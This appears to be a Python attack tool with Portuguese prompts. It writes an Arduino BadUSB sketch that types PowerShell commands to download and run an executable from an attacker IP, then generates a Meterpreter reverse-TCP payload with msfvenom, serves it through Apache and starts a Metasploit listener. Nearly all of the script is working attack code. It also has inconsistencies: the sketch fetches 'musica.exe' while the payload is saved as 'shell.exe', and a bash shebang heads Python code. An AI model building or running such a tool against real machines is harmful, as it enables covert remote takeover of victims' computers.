#!/bin/bash
# _-*- coding: utf-8 -*-
from os import system as cmd
from bannerArdLoad import BannerArdLoad

class ArdLoad:

	global __payload
	__payload = "windows/meterpreter/reverse_tcp"

	def setIP(self):
		while(True):
			self.__ip = input("Digite o IP: ")
			if (self.__ip == "") or (self.__ip == None):
				print("IP Invalido, digite novamente!")
			else:
				break
		#self.__ip = "192.168.0.109"

	def __getIP(self):
		return self.__ip

	def setPorta(self):
		while (True):
			self.__porta = int(input("Digite a Porta: "))
			if (self.__porta >= 1 and self.__porta <= 65535):
				break
			else:
				print("Porta invalida, digite novamente!")
			
		#self.__porta = 4444

	def __getPorta(self):
		return self.__porta


	def criandoSketch(self):
		arq = open("reverse.ino", "w")
		arq.write("#include \"Keyboard.h\"\n\n")
		
		arq.write("void typeKey(int key){\n")
		arq.write("\tKeyboard.press(key);\n")
		arq.write("\tdelay(50);\n")
		arq.write("\tKeyboard.release(key);\n}")

		arq.write("\n\n")
		arq.write("void setup(){\n")
		arq.write("\tKeyboard.begin();\n")
		arq.write("\tdelay(1500);\n")

		arq.write("\tKeyboard.press(KEY_LEFT_GUI);\n")
		arq.write("\tdelay(500);\n")

		arq.write("\tKeyboard.press('r');\n")
		arq.write("\tKeyboard.releaseAll();\n")

		arq.write("\tdelay(500);\n")
		arq.write("\tKeyboard.print(\"cmd\");\n")
		arq.write("\ttypeKey(KEY_RETURN);\n")

		arq.write("\tdelay(500);\n")
		arq.write("\tKeyboard.print(\"powershell\");\n")
		arq.write("\ttypeKey(KEY_RETURN);\n")

		arq.write("\tdelay(1000);\n")
		arq.write("\tKeyboard.print(\"Invoke-WebRequest -Uri \'http://"+self.__ip+"/musica.exe\' -outfile \'D:\\\\\\\\musica.exe\'\");\n")
		arq.write("\tdelay(1500);\n")
		arq.write("\ttypeKey(KEY_RETURN);\n")

		arq.write("\tKeyboard.print(\"& \'D:\\\\\\\\musica.exe\\\'\");\n")
		arq.write("\tdelay(500);\n")
		arq.write("\ttypeKey(KEY_RETURN);\n")

		arq.write("\tKeyboard.print(\"exit\");\n")
		arq.write("\tdelay(500);\n")
		arq.write("\ttypeKey(KEY_RETURN);\n")

		arq.write("\tKeyboard.print(\"exit\");\n")
		arq.write("\tdelay(1000);\n")
		arq.write("\ttypeKey(KEY_RETURN);\n")

		arq.write("\tKeyboard.end();\n}")

		arq.write("\n\n")
		arq.write("void loop(){}\n")
		arq.close()

		print("Sketch \"reverse.ino\" concluída, grave no Arduino")

	def iniciarApacheMSF(self):
		#APACHE
		print("Iniciando Apache...\n")

		cmd("service apache2 start")
		print("Apache iniciado\n")

		print("Gerando Payload...")

		#GERANDO PAYLOAD
		cmd("msfvenom --payload windows/meterpreter/reverse_tcp LHOST=" + self.__ip + " LPORT=" + str(self.__porta) + " -f exe > /var/www/html/shell.exe")

		#METASPLOIT
		print("\nInciando e Configurando Metasploit...")

		msfArq = open("configMetasploit.rc", "w")
		msfArq.write("use exploit/multi/handler\n")
		msfArq.write("set PAYLOAD " + __payload + "\n")
		msfArq.write("set LHOST " + self.__ip + "\n")
		msfArq.write("set LPORT " + str(self.__porta) + "\n")
		msfArq.write("set EnableStageEncoding true\n")
		msfArq.write("set ExitOnSession false\n")
		msfArq.write("exploit -j\n")
		msfArq.close()
		cmd("msfconsole -r configMetasploit.rc")

	def __init__(self):
		pass


if __name__ == "__main__":

	__arduino = ArdLoad()
	__arduino.setIP()
	__arduino.setPorta()

	while(True):
		resp = input("\nCriar Sketch? [s/n][s]: ")
		if resp == "n":
			print("Sketch não criado...")
			break
		elif resp == "s" or resp == "":
			__arduino.criandoSketch()
			break
		else:
			print("Digite novamente...")

	while(True):
		resp = input("\nIniciar Apache e Metasploit? [s/n][s]: ")
		if resp == "n":
			print("Metasploit e Escuta não iniciados...")
			break
		elif resp == "s" or resp == "":
			__arduino.iniciarApacheMSF()
			break
		else:
			print("Digite novamente...")